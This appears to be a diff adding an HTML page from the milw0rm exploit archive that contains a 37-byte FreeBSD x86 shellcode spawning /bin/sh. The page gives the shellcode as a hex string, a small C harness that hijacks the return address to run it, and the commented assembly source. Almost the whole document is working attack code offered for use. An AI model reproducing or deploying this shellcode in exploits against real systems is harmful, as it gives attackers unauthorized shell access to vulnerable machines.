@@ -1,0 +1,46 @@
+<html>
+<head>
+<title>freebsd/x86 execve /bin/sh 37 bytes</title>
+<pre>
+/* This is FreeBSD execve() code.It is 37 bytes long.I'll try to make it *
+ * smaller.Till then use this one.                                       *
+ *                                       signed predator                 *
+ *                                       preedator(at)sendmail(dot)ru    *
+ *************************************************************************/
+
+char FreeBSD_code[]=
+&quot;\xeb\x17\x5b\x31\xc0\x88\x43\x07\x89\x5b\x08\x89\x43\x0c\x50\x8d&quot;
+&quot;\x53\x08\x52\x53\xb0\x3b\x50\xcd\x80\xe8\xe4\xff\xff\xff/bin/sh&quot;;
+
+int main(){
+ int *ret=(int *)(&amp;ret+2);
+ printf(&quot;len : %d\n&quot;,strlen(FreeBSD_code));
+ *ret=(int)FreeBSD_code;
+}
+
+/*****************************************
+ *int main(){                            *
+ *   __asm__(&quot;jmp  callme         \n&quot;    *
+ *           &quot;jmpme:              \n&quot;    *
+ *           &quot;pop %ebx            \n&quot;    *
+ *           &quot;xorl %eax,%eax      \n&quot;    *
+ *           &quot;movb %al,0x7(%ebx)  \n&quot;    *
+ *           &quot;movl %ebx,0x8(%ebx) \n&quot;    *
+ *	     &quot;movl %eax,0xc(%ebx) \n&quot;    *
+ *           &quot;push %eax           \n&quot;    *
+ *	     &quot;leal 0x8(%ebx),%edx \n&quot;    *
+ *	     &quot;push %edx           \n&quot;    *
+ *	     &quot;push %ebx           \n&quot;    *
+ *	     &quot;movb $0x3b,%al      \n&quot;    *
+ *           &quot;push %eax	          \n&quot;    *
+ *           &quot;int $0x80           \n&quot;    *
+ *           &quot;callme:	          \n&quot;    *
+ *           &quot;call jmpme          \n&quot;    *
+ *           &quot;.string \&quot;/bin/sh\&quot; \n&quot;);  *
+ *}                                      *
+ *****************************************/
+
+// milw0rm.com [2004-09-26]
+</pre>
+</html>
+
